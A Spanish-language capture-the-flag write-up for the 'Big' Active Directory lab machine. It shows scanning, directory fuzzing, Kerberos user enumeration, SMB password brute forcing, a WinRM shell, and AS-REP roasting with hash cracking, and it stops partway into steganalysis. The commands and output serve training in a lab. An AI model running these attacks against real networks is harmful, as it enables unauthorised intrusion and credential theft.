---
title: "Big - TheHackerLabs"
date: 2025-04-18
draft: false
slug: "THL-writeup-big"
excerpt: "Esta fue una máquina lo suficientemente difícil. Después de analizar el escaneo de servicios, empezamos revisando la página web, que al no encontrar nada, aplicamos Fuzzing a directorios web, en donde encontraremos algunos que contienen imágenes, letras de canciones (entre ellas un wordlist) y un mensaje de un usuario que resulta ser una pista. Enumeramos los usuarios del servicio Kerberos con kerbrute y aplicamos fuerza bruta al servicio SMB, utilizando el wordlist encontrado, siendo así que encontramos la contraseña de un usuario. Esto nos permite loguearnos al servicio WinRM con evil-winrm. Además, aplicamos el AS-REP Roasting attack, logrando crackear el hash krb5asrep que resultó ser del mismo usuario al que obtuvimos su contraseña con la fuerza bruta al SMB. También aplicamos estegoanalisis a las imágenes encontradas, resultando en encontrar y obtener un archivo que contiene la contraseña de otro usuario. Para terminar, analizamos el AD con SharpHound v1.1.1 y BloodHound Community Edition, descubriendo que nuestro primero usuario obtenido, pertenece al grupo ACCOUNT OPERATORS, que a su vez, tiene el permiso GenericAll sobre un grupo personalizado llamado SPECIAL PERMISSIONS, siendo que este grupo puede cambiar el permiso DACL del dominio, con lo que podemos aplicar el DCSync Attack y así  logramos escalar privilegios."
categories: ["TheHackerLabs", "Hard Machine"]
tags: ["Windows", "Active Directory", "Kerberos", "SMB", "LDAP", "WinRM", "Web Enumeration", "Fuzzing", "Brute Force Attack", "Kerberos Enumeration", "AS-REP Roasting Attack", "Cracking Hash", "Steganalysis", "SharpHound and BloodHound Enumeration", "DCSync Attack", "Privesc - DCSync Attack", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "arp-scan"
  - "wappalizer"
  - "wfuzz"
  - "gobuster"
  - "kerbrute_linux_amd64"
  - "wget"
  - "file"
  - "strings"
  - "head"
  - "exiftool"
  - "crackmapexec"
  - "evil-winrm"
  - "impacket-GetNPUsers"
  - "JohnTheRipper"
  - "hashcat"
  - "apt"
  - "steghide"
  - "stegcracker"
  - "stegseek"
  - "grep"
  - "md5sum"
  - "awk"
  - "echo"
  - "SharpHound v1.1.1"
  - "BloodHound Community Edition"
  - "PowerView.ps1"
  - "net group"
  - "whoami"
  - "impacket-secretsdump"
  - "impacket-psexec"
links:
  - "https://infosecwriteups.com/beginners-ctf-guide-finding-hidden-data-in-images-e3be9e34ae0d"
  - "https://github.com/zed-0xff/zsteg"
  - "https://latam.kaspersky.com/resource-center/definitions/what-is-steganography"
  - "https://www.kali.org/tools/stegcracker/"
  - "https://www.reddit.com/r/computerforensics/comments/be92z5/is_there_any_tool_to_identify_steganography/"
  - "https://github.com/bannsec/stegoveritas"
  - "https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1"
  - "https://github.com/SpecterOps/SharpHound/releases/tag/v1.1.1"
  - "https://m4lwhere.medium.com/the-ultimate-guide-for-bloodhound-community-edition-bhce-80b574595acf"
  - "https://nordvpn.com/cybersecurity/glossary/steganalysis/"
  - "https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/dcsync.html?highlight=dcsync%20attack#dcsync-1"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-big/big.png"
---

## Recopilación de Información {#Recopilacion}

### Descubrimiento de Hosts {#Hosts}

Hagamos un descubrimiento de hosts para encontrar a nuestro objetivo.

Lo haremos primero con **nmap**:
```bash
nmap -sn 192.168.212.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-17 12:31 CST
...
Nmap scan report for 192.168.212.4
Host is up (0.0012s latency).
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
...
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.23 seconds
```

Vamos a probar la herramienta **arp-scan**:
```bash
arp-scan -I eth0 -g 192.168.212.0/24
Interface: eth0, type: EN10MB, MAC: XX, IPv4: Tu_IP
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
...
192.168.212.4	XX	PCS Systemtechnik GmbH

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.173 seconds (117.81 hosts/sec). 3 responded
```
Encontramos nuestro objetivo y es: `192.168.212.4`.

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.212.4
PING 192.168.212.4 (192.168.212.4) 56(84) bytes of data.
64 bytes from 192.168.212.4: icmp_seq=1 ttl=128 time=1.11 ms
64 bytes from 192.168.212.4: icmp_seq=2 ttl=128 time=0.796 ms
64 bytes from 192.168.212.4: icmp_seq=3 ttl=128 time=2.37 ms
64 bytes from 192.168.212.4: icmp_seq=4 ttl=128 time=1.22 ms

--- 192.168.212.4 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3045ms
rtt min/avg/max/mdev = 0.796/1.375/2.372/0.596 ms
```
Por el TTL sabemos que la máquina usa **Windows**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.212.4 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-17 12:37 CST
Initiating ARP Ping Scan at 12:37
Scanning 192.168.212.4 [1 port]
Completed ARP Ping Scan at 12:37, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:37
Scanning 192.168.212.4 [65535 ports]
Discovered open port 135/tcp on 192.168.212.4
Discovered open port 80/tcp on 192.168.212.4
Discovered open port 53/tcp on 192.168.212.4
Discovered open port 139/tcp on 192.168.212.4
Discovered open port 445/tcp on 192.168.212.4
Discovered open port 47001/tcp on 192.168.212.4
Discovered open port 49666/tcp on 192.168.212.4
Discovered open port 88/tcp on 192.168.212.4
Discovered open port 49686/tcp on 192.168.212.4
Discovered open port 49673/tcp on 192.168.212.4
Discovered open port 49665/tcp on 192.168.212.4
Discovered open port 49669/tcp on 192.168.212.4
Discovered open port 49676/tcp on 192.168.212.4
Discovered open port 9389/tcp on 192.168.212.4
Discovered open port 3269/tcp on 192.168.212.4
Discovered open port 49670/tcp on 192.168.212.4
Discovered open port 593/tcp on 192.168.212.4
Discovered open port 49667/tcp on 192.168.212.4
Increasing send delay for 192.168.212.4 from 0 to 5 due to max_successful_tryno increase to 4
Discovered open port 49671/tcp on 192.168.212.4
Discovered open port 5985/tcp on 192.168.212.4
Discovered open port 3268/tcp on 192.168.212.4
Discovered open port 49708/tcp on 192.168.212.4
Discovered open port 389/tcp on 192.168.212.4
Discovered open port 49664/tcp on 192.168.212.4
Discovered open port 636/tcp on 192.168.212.4
Discovered open port 464/tcp on 192.168.212.4
Increasing send delay for 192.168.212.4 from 5 to 10 due to max_successful_tryno increase to 5
Completed SYN Stealth Scan at 12:38, 62.04s elapsed (65535 total ports)
Nmap scan report for 192.168.212.4
Host is up, received arp-response (0.0021s latency).
Scanned at 2025-04-17 12:37:55 CST for 62s
Not shown: 65509 closed tcp ports (reset)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 128
80/tcp    open  http             syn-ack ttl 128
88/tcp    open  kerberos-sec     syn-ack ttl 128
135/tcp   open  msrpc            syn-ack ttl 128
139/tcp   open  netbios-ssn      syn-ack ttl 128
389/tcp   open  ldap             syn-ack ttl 128
445/tcp   open  microsoft-ds     syn-ack ttl 128
464/tcp   open  kpasswd5         syn-ack ttl 128
593/tcp   open  http-rpc-epmap   syn-ack ttl 128
636/tcp   open  ldapssl          syn-ack ttl 128
3268/tcp  open  globalcatLDAP    syn-ack ttl 128
3269/tcp  open  globalcatLDAPssl syn-ack ttl 128
5985/tcp  open  wsman            syn-ack ttl 128
9389/tcp  open  adws             syn-ack ttl 128
47001/tcp open  winrm            syn-ack ttl 128
49664/tcp open  unknown          syn-ack ttl 128
49665/tcp open  unknown          syn-ack ttl 128
49666/tcp open  unknown          syn-ack ttl 128
49667/tcp open  unknown          syn-ack ttl 128
49669/tcp open  unknown          syn-ack ttl 128
49670/tcp open  unknown          syn-ack ttl 128
49671/tcp open  unknown          syn-ack ttl 128
49673/tcp open  unknown          syn-ack ttl 128
49676/tcp open  unknown          syn-ack ttl 128
49686/tcp open  unknown          syn-ack ttl 128
49708/tcp open  unknown          syn-ack ttl 128
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 62.27 seconds
           Raw packets sent: 270962 (11.922MB) | Rcvd: 65540 (2.622MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Son muchos puertos y varios están relacionados con **Active Directory** como el **puerto 88** que es el **protocolo Kerberos**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49669,49670,49671,49673,49676,49686,49708 192.168.212.4 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-17 12:39 CST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.212.4
Host is up (0.0017s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0

| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-17 19:39:36Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: bbr.thl, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: bbr.thl, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49686/tcp open  msrpc         Microsoft Windows RPC
49708/tcp open  msrpc         Microsoft Windows RPC
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: BIG; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:

|_clock-skew: 59m58s
| smb2-time: 
|   date: 2025-04-17T19:40:31
|_  start_date: 2025-04-17T19:28:41
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_nbstat: NetBIOS name: BIG, NetBIOS user: <unknown>, NetBIOS MAC: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.72 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Muy bien, tenemos bastante información.

Para empezar, el **servicio LDAP** nos dio el dominio que está ocupando el **AD**, siendo **bbr.thl**. Regístralo en el `/etc/hosts`.

Vemos que tiene una página web activa en el **puerto 80**, y también parece estar activo el **servicio WinRM** en el **puerto 5985**.

Y por último, parece que el **servicio SMB** necesita credenciales válidas para poder listar los recursos compartidos.

Con todo esto visto, vamos a empezar por la página web y luego por el **servicio Kerberos**.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-big/Captura1.png">
</p>

Parece solo una página que muestra una imagen.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-big/Captura2.png">
</p>

No nos muestra mucho.

Si vemos el código fuente, solamente veremos un comentario extraño y un pequeño texto:

<p align="center">
<img src="/assets/images/THL-writeup-big/Captura3.png">
</p>

De ahí en fuera, no veo nada más, así que vamos a aplicar **Fuzzing** para ver si hay algo oculto por ahí.

### Fuzzing {#fuzz}

```bash
wfuzz -c --hc=404 -t 300 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt http://192.168.212.4/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.212.4/FUZZ
Total requests: 1185240

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000000002:   301        1 L      10 W       151 Ch      "images"                                                                                                                     
000000635:   301        1 L      10 W       153 Ch      "contents"                                                                                                                   
000036871:   200        21 L     41 W       435 Ch      "http://192.168.212.4/"                                                                                                      
000005751:   301        1 L      10 W       150 Ch      "songs"                                                                                                                      
000941761:   200        21 L     41 W       435 Ch      "%5c"                                                                                                                        
...
...

Total time: 0
Processed Requests: 1185240
Filtered Requests: 1185213
Requests/sec.: 0
```

| Parámetros | Descripción |
|---|---|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://192.168.212.4/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -t 100
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.212.4/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 151] [--> http://192.168.212.4/images/]
/contents             (Status: 301) [Size: 153] [--> http://192.168.212.4/contents/]
/songs                (Status: 301) [Size: 150] [--> http://192.168.212.4/songs/]
...
Progress: 1185240 / 1185241 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |

Encontramos 3 directorios con ambas herramientas. Investiguemos que contienen.

### Analizando Directorios Web Encontrados {#directorios}

Si entramos en el directorio `/images`, solo encontraremos 4 imágenes y un archivo **web.config** que no contiene nada:

<p align="center">
<img src="/assets/images/THL-writeup-big/Captura4.png">
</p>

Lo primero que se puede notar, es que cada imagen tiene un peso más alto que otras y cada imagen es distinta.

Si entramos en el directorio `/contents`, encontraremos solamente un archivo de texto:

<p align="center">
<img src="/assets/images/THL-writeup-big/Captura5.png">
</p>

Entrando en el archivo, veremos que es un mensaje:

<p align="center">
<img src="/assets/images/THL-writeup-big/Captura6.png">
</p>

Nos están dando una pista, ya que el mensaje menciona que se escondieron llaves en **MD5**. Además, parece que tenemos un usuario llamado **music**.

Si entramos en el directorio `/songs`, encontraremos varios archivos de texto que parecen ser letras de canciones:

<p align="center">
<img src="/assets/images/THL-writeup-big/Captura7.png">
</p>

Revisando cada archivo, confirmamos que son canciones a excepción del **archivo Skyisthelimit.txt** que parece ser un wordlist de contraseñas:

<p align="center">
<img src="/assets/images/THL-writeup-big/Captura8.png">
</p>

Quizá es parte de la máquina este wordlist.

Por ahora, ya tenemos algunas pistas sobre lo que podemos hacer para avanzar con la máquina. Pero, primero vamos a comprobar los usuarios existentes en el **servicio Kerberos**.

### Enumeración de Usuarios del Servicio Kerbrute con Kerbrute {#Kerbrute}

Por ahora, tenemos al menos un usuario posible que encontramos en el directorio `/contents`. Podría ser que otro usuario sea **big**, ya que el escaneo de servicios menciona que es el nombre de la máquina. Además, encontramos muchas referencias a este artista, así que es muy probable que sea otro usuario.

Vamos a comprobar si estamos en lo correcto utilizando la herramienta **Kerbrute**.

Puedes obtenerlo aquí:
* <a href="https://github.com/ropnop/kerbrute" target="_blank">Repositorio de ropnop: kerbrute</a>

Mete esos dos usuarios en un archivo de texto para utilizarlo con **kerbrute**:
```bash
./kerbrute_linux_amd64 userenum -d bbr.thl --dc 192.168.212.4 posiblesUsuarios.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 04/17/25 - Ronnie Flathers @ropnop

2025/04/17 15:54:23 >  Using KDC(s):
2025/04/17 15:54:23 >  	192.168.212.4:88

2025/04/17 15:54:23 >  [+] VALID USERNAME:	 big@bbr.thl
2025/04/17 15:54:23 >  [+] VALID USERNAME:	 music@bbr.thl
2025/04/17 15:54:23 >  Done! Tested 2 usernames (2 valid) in 0.029 seconds
```
Excelente, si existen estos dos usuarios.

Pero quizá existan más, por lo que haremos de nuevo el escaneo y usaremos el wordlists **xat-net-10-million-usernames.txt**:
```bash
./kerbrute_linux_amd64 userenum -d bbr.thl --dc 192.168.212.4 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 04/17/25 - Ronnie Flathers @ropnop

2025/04/17 13:08:15 >  Using KDC(s):
2025/04/17 13:08:15 >  	192.168.212.4:88

2025/04/17 13:08:15 >  [+] VALID USERNAME:	 big@bbr.thl
2025/04/17 13:08:16 >  [+] VALID USERNAME:	 song@bbr.thl
2025/04/17 13:08:17 >  [+] VALID USERNAME:	 music@bbr.thl
2025/04/17 13:08:18 >  [+] VALID USERNAME:	 administrator@bbr.thl
2025/04/17 13:08:37 >  [+] VALID USERNAME:	 Administrator@bbr.thl
2025/04/17 13:08:49 >  [+] VALID USERNAME:	 BIG@bbr.thl
2025/04/17 13:08:53 >  [+] VALID USERNAME:	 Music@bbr.thl
2025/04/17 13:09:29 >  [+] VALID USERNAME:	 Big@bbr.thl
2025/04/17 13:11:28 >  [+] VALID USERNAME:	 Song@bbr.thl
```
El escaneo duro un rato, pero solamente encontró estos usuarios que solamente agrega al **usuario song y administrator**.

### Analizando Imagenes Encontradas en Directorio {#ImagenesBig}

De acuerdo al mensaje que encontramos en el directorio `/content`, puede que alguna imagen contenga un **hash MD5** oculto.

Vamos a descargar las imágenes y luego vamos a analizar cada una para ver que podemos encontrar.

Descarguemos todas las imágenes con **wget**:
```bash
wget -r -l1 -nd -A jpg http://192.168.212.4/images/

--2025-04-17 13:29:01--  http://192.168.212.4/images/
Conectando con 192.168.212.4:80... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 563 [text/html]
...
...
--2025-04-17 13:29:01--  http://192.168.212.4/images/big1.jpg
Reutilizando la conexión con 192.168.212.4:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 53019 (52K) [image/jpeg]
Grabando a: «big1.jpg»

big1.jpg   100%[=====================>]  51.78K  --.-KB/s    en 0.02s   

2025-04-17 13:29:01 (3.11 MB/s) - «big1.jpg» guardado [53019/53019]

--2025-04-17 13:29:01--  http://192.168.212.4/images/big2.jpg
Reutilizando la conexión con 192.168.212.4:80.
Petición HTTP enviada, esperando respuesta... 200 OK
...
...
...
ACABADO --2025-04-17 13:29:01--
Tiempo total de reloj: 0.1s
Descargados: 6 ficheros, 649K en 0.06s (10.6 MB/s)
```
Listo, ya las tenemos todas.

Para el análisis, utilizaremos las siguientes herramientas:
* *file*
* *strings*
* *exiftool*

Veamos qué nos muestra **file**:
```bash
file big1.jpg
big1.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, progressive, precision 8, 1920x1080, components 3

file big2.jpg
big2.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 1191x670, components 3

file big3.jpg
big3.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 1024x768, components 3

file big4.jpg
big4.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 1280x800, components 3
```
Parecen ser imágenes simples.

Lo curioso empieza cuando vemos las imágenes con **strings**, pues con **big2.jpg** parece que muestra un hash:
```bash
strings big2.jpg | head -n 10
JFIF
 $.' ",#
(7),01444
'9=82<.342
!22222222222222222222222222222222222222222222222222
$3br
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
	#3R
&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
<JYC6
```
Pero no resulta ser algo útil.

Y con **exiftool** tampoco muestra algo.

Investigando un poco sobre **"como encontrar data oculta en imágenes"**, encontré el siguiente blog:
* <a href="https://infosecwriteups.com/beginners-ctf-guide-finding-hidden-data-in-images-e3be9e34ae0d" target="_blank">Beginners CTF Guide: Finding Hidden Data in Images</a>

Al final menciona sobre el tema de **Estenografía**. Investiguemos que es esto:

| **Estenografía** |
|:-----------:|
| *La esteganografía es la práctica de ocultar información dentro de otro mensaje u objeto físico para evitar su detección. Se puede usar para ocultar casi cualquier tipo de contenido digital, ya sea texto, imágenes, videos o audios. Luego, dichos datos ocultos se extraen en destino.* |

Además, menciona unas herramientas que podemos utilizar, pero esas herramientas no nos ayudaran, ya que están obsoletas, así que de momento, pasemos a revisar otras cosas.

Recordando que tenemos usuarios válidos y un wordlist de contraseña que encontramos en la página web, podemos aplicar **Fuerza Bruta** y quizá el **ASREP-Roasting Attack**.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando Fuerza Bruta a Servicio SMB {#FuerzaBruta}

Vamos a descargar el wordlist de contraseñas que está en la página web con **wget**:
```bash
wget http://192.168.212.4/songs/Skyisthelimit.txt
--2025-04-17 12:50:50--  http://192.168.212.4/songs/Skyisthelimit.txt
Conectando con 192.168.212.4:80... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 1793 (1.8K) [text/plain]
Grabando a: «Skyisthelimit.txt»

Skyisthelimit.txt      100%[=================>]   1.75K  --.-KB/s    en 0s      

2025-04-17 12:50:51 (225 MB/s) - «Skyisthelimit.txt» guardado [1793/1793]
```

Y con **crackmapexec**, vamos a aplicar fuerza bruta al **servicio SMB** y utilizaremos un pequeño filtro para que nos muestre los resultados válidos:
```bash
crackmapexec smb 192.168.212.4 -u usuarios.txt -p Skyisthelimit.txt --continue-on-success | grep "[+]"
SMB                      192.168.212.4   445    BIG              [+] bbr.thl\song:******
```

Muy bien, tenemos la contraseña del **usuario song** y si recordamos el escaneo de servicios, está activo el **servicio WinRM**, por lo que podemos probar si estas credenciales sirven para ese servicio:
```bash
crackmapexec winrm 192.168.212.4 -u 'song' -p '******'
SMB         192.168.212.4   5985   BIG              [*] Windows 10 / Server 2016 Build 14393 (name:BIG) (domain:bbr.thl)
HTTP        192.168.212.4   5985   BIG              [*] http://192.168.212.4:5985/wsman
WINRM       192.168.212.4   5985   BIG              [+] bbr.thl\song:****** (Pwn3d!)
```
Excelente, podemos conectarnos a la máquina víctima con la herramienta **evil-winrm**.

Hagámoslo:
```batch
evil-winrm -i 192.168.212.4 -u 'song' -p '******'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\TEMP\Documents> whoami
bbr\song
```
Estamos dentro, pero este usuario no tiene la flag.

### Aplicando AS-REP Roasting Attack {#AS-REP}

Como ya tenemos una lista de usuarios válidos, podemos aplicar el **AS-REP Roasting Attack**, con tal de confirmar si algún usuario tiene la flag **UF_DONT_REQUIRE_PREAUTH** y así capturar el **hash krb5asrep** que contiene la contraseña del usuario con esta flag.

Lo haremos con la herramienta **impacket-GetNPUsers**:
```bash
impacket-GetNPUsers -no-pass -usersfile usuarios.txt bbr.thl/
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] User big doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$song@BBR.THL:03ca8e428eb7f65eed7f026ca8332ca6$ae9da9376d85f2f338e8...
[-] User music doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
```
Genial, el **usuario song** tiene activa esta flag.

Ahora, tenemos que crackear este hash para encontrar la contraseña y lo haremos con **hashcat** y con **JohnTheRipper**.

Como wordlist de contraseñas, usaremos el que encontramos en la página web.

Primero, lo haremos con **JohnTheRipper**:
```bash
john -w:Skyisthelimit.txt ASREP-hash --format=krb5asrep
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 SSE2 4x])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
******    ($krb5asrep$23$song@BBR.THL)     
1g 0:00:00:00 DONE (2025-04-17 16:06) 33.33g/s 6700p/s 6700c/s 6700C/s 123456..qwerty123456
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Ahora con **hashcat**:
```bash
hashcat -m 18200 -a 0 ASREP-hash Skyisthelimit.txt
hashcat (v6.2.6) starting
...
...
...
...
$krb5asrep$23$song@BBR.THL:03ca8e428eb7f65eed7f026ca8332ca6$ae9da....:******

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$song@BBR.THL:03ca8e428eb7f65eed7f026c...134458
Time.Started.....: Thu Apr 17 16:06:52 2025 (0 secs)
Time.Estimated...: Thu Apr 17 16:06:52 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (Skyisthelimit.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    56857 H/s (0.29ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 201/201 (100.00%)
Rejected.........: 0/201 (0.00%)
Restore.Point....: 0/201 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> qwerty123456
Hardware.Mon.#1..: Util:  3%

Started: Thu Apr 17 16:06:37 2025
Stopped: Thu Apr 17 16:06:53 2025
```
Obtuvimos la contraseña y es la misma que encontramos en el **ataque de fuerza bruta**.

### Extrayendo Archivo Oculto de una Imagen Aplicando Estegoanálisis {#Estegoanalisis}

¿Qué es **Steganalysis/Estegonálisis**?

| **Steganalysis/Estegonálisis** |
|:-----------:|
| *El estegoanálisis es la disciplina que se encarga de detectar, analizar y, en algunos casos, extraer información oculta dentro de archivos (como imágenes, audio o video) que han sido modificados utilizando técnicas de esteganografía. Mientras que la esteganografía se enfoca en ocultar información de forma encubierta, el estegoanálisis tiene el objetivo opuesto: descubrir si existe algo oculto y tratar de revelar su contenido.* |

Para poder hacer esto, podemos ocupar las siguientes herramientas:
* *steghide*
* *stegcracker*
* *stegseek*

Instalemos primero **steghide** para probarlo contra las imágenes:
```bash
apt install steghide
```
Listo.

Intentemos extraer algún archivo oculto (**extract**) a cualquiera de las imágenes (**-sf**).

Pero nos da lo siguiente:
```bash
steghide extract -sf big1.jpg
Anotar salvoconducto:
```
Nos pide un **salvoconducto**, que en realidad es una contraseña.

Pero como no tenemos una contraseña, ¿qué podemos probar? Recordemos que hay una **clave oculta en MD5**, y recordando que más tenemos, están los archivos de texto que son letras de canciones dentro del directorio `/songs`.

